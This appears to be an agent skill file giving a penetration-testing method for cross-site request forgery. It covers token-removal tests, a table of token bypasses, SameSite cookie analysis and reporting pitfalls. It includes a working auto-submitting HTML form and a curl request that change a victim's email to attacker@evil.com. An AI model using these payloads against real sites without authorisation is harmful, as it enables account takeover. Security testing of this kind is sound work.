---
name: csrf-methodology
description: "Cross-site request forgery: identifying state-changing endpoints without CSRF protection, bypassing token checks, and crafting a working PoC. Use this skill when testing for CSRF."
---

# CSRF

## Overview

CSRF makes a victim's browser send an authenticated request. Requires: a state-changing action, cookie-based auth, and no unpredictable parameter.

## Test

1. Identify a state-changing request (password change, email change, transfer).
2. Remove the CSRF token → does it still succeed?
3. Change the token to a random value → still succeeds?
4. Remove `Referer`/`Origin` → still succeeds?

```bash
curl -X POST https://target/email -b "session=abc" -d "email=attacker@evil.com"
```

## Token bypasses

| Weakness | Bypass |
|---|---|
| Token tied to a session but not validated | omit it |
| Token validated only when present | remove the parameter |
| Token compared with `==` in a weak language | type juggling |
| Token in a cookie and a header/body (double submit) | set both via a subdomain cookie |
| Token reused across sessions | grab your own token |
| Method override | `_method=POST` with GET |

## SameSite analysis

```
Set-Cookie: session=abc; SameSite=Lax
```

- `Strict` — no cross-site sending.
- `Lax` — sent on top-level GET navigations; POST from a cross-site form is blocked, but a top-level GET works. If the action is reachable via GET, Lax is bypassable.
- `None` — sent always, requires `Secure`.

## PoC

```html
<form action="https://target/email" method="POST" id="f">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('f').submit()</script>
```

For JSON endpoints, use `fetch` with `Content-Type: text/plain` — many frameworks still parse it.

## Login CSRF

Force a victim to log into your account, then observe their actions (saved searches, payment methods).

## Pitfalls

- A missing token is not a finding if the endpoint requires a non-cookie header (`X-Requested-With`) that a cross-site page cannot set without a preflight.
- SameSite=Lax blocks most POST CSRF in modern browsers.
- Impact needs a privileged action; "logout CSRF" is not a finding.

## Verification

The PoC must perform the state change on the victim's account in a real browser.
